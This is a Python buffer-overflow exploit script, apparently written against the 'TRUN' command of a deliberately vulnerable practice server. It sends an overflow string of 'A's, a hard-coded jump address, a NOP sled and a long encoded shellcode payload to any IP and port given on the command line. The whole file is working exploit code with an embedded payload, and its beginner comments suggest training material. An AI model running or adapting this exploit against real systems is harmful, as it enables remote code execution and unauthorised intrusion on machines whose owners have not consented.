import socket
import sys

ip=sys.argv[1]
port=int(sys.argv[2])
length=int(sys.argv[3])

#AF_INET -> IPv4
#SOCK_STREAM -> TCP Connection (SOCK_DGRAM -> UDP)
#Constructor
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#initiate the connection
sock.connect((ip, port))
sock.settimeout(5)

#Grab the banner out of socket and print it
#.decode() -> convert binary data into ascii (gets rid of the b'')
data = sock.recv(4096).decode()
print(data)

print("Trying length: " + str(length))
#A -> 41 in hex
junk = ('TRUN .' + 'A'*length).encode()
#b'' -> raw bytes
jmp = b'\xD3\x11\x50\x62'

buf = b""
buf += b"\xdb\xd2\xba\xd5\xe1\xda\x36\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x56\x31\x56\x18\x83\xee\xfc\x03\x56\xc1\x03"
buf += b"\x2f\xca\x01\x41\xd0\x33\xd1\x26\x58\xd6\xe0\x66\x3e"
buf += b"\x92\x52\x57\x34\xf6\x5e\x1c\x18\xe3\xd5\x50\xb5\x04"
buf += b"\x5e\xde\xe3\x2b\x5f\x73\xd7\x2a\xe3\x8e\x04\x8d\xda"
buf += b"\x40\x59\xcc\x1b\xbc\x90\x9c\xf4\xca\x07\x31\x71\x86"
buf += b"\x9b\xba\xc9\x06\x9c\x5f\x99\x29\x8d\xf1\x92\x73\x0d"
buf += b"\xf3\x77\x08\x04\xeb\x94\x35\xde\x80\x6e\xc1\xe1\x40"
buf += b"\xbf\x2a\x4d\xad\x70\xd9\x8f\xe9\xb6\x02\xfa\x03\xc5"
buf += b"\xbf\xfd\xd7\xb4\x1b\x8b\xc3\x1e\xef\x2b\x28\x9f\x3c"
buf += b"\xad\xbb\x93\x89\xb9\xe4\xb7\x0c\x6d\x9f\xc3\x85\x90"
buf += b"\x70\x42\xdd\xb6\x54\x0f\x85\xd7\xcd\xf5\x68\xe7\x0e"
buf += b"\x56\xd4\x4d\x44\x7a\x01\xfc\x07\x12\xe6\xcd\xb7\xe2"
buf += b"\x60\x45\xcb\xd0\x2f\xfd\x43\x58\xa7\xdb\x94\xe9\xaf"
buf += b"\xdb\x4b\x51\xbf\x25\x6c\xa1\xe9\xe1\x38\xf1\x81\xc0"
buf += b"\x40\x9a\x51\xec\x94\x36\x58\x7a\xd7\x6e\x97\x51\xbf"
buf += b"\x6c\x28\x86\xda\xf9\xce\x96\x74\xa9\x5e\x57\x25\x09"
buf += b"\x0f\x3f\x2f\x86\x70\x5f\x50\x4d\x19\xca\xbf\x3b\x71"
buf += b"\x63\x59\x66\x09\x12\xa6\xbd\x77\x14\x2c\x37\x87\xdb"
buf += b"\xc5\x32\x9b\x0c\xb2\xbc\x63\xcd\x57\xbc\x09\xc9\xf1"
buf += b"\xeb\xa5\xd3\x24\xdb\x69\x2b\x03\x58\x6d\xd3\xd2\x68"
buf += b"\x05\xe2\x40\xd4\x71\x0b\x85\xd4\x81\x5d\xcf\xd4\xe9"
buf += b"\x39\xab\x87\x0c\x46\x66\xb4\x9c\xd3\x89\xec\x71\x73"
buf += b"\xe2\x12\xaf\xb3\xad\xed\x9a\xc7\xaa\x11\x58\xe0\x12"
buf += b"\x79\xa2\xb0\xa2\x79\xc8\x30\xf3\x11\x07\x1e\xfc\xd1"
buf += b"\xe8\xb5\x55\x79\x62\x58\x17\x18\x73\x71\xf9\x84\x74"
buf += b"\x76\x22\x37\x0e\xf7\xd5\xb8\xef\x11\xb2\xb9\xef\x1d"
buf += b"\xc4\x86\x39\x24\xb2\xc9\xf9\x13\xcd\x7c\x5f\x35\x44"
buf += b"\x7e\xf3\x45\x4d"

nopsled = b'\x90'*30

badstr = junk + jmp + nopsled + buf
#print(badstr)

sock.send(badstr)
data = sock.recv(4096).decode()
print(data)

sock.close()
